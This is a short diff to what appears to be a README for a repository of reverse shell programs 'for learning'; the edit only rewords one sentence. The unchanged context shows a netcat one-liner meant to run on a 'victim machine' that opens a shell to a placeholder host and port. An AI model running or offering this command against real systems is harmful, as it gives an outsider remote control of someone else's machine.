@@ -2,7 +2,7 @@
 
 Reverse shell programs on Windows and Linux for learning.
 
-To make simple reverse shell on linux, you can run like this on victim machine↓
+To make simple reverse shell on linux, run like this↓ on victim machine
 ```
 nc -e /bin/sh <HOST> <PORT>
 ```
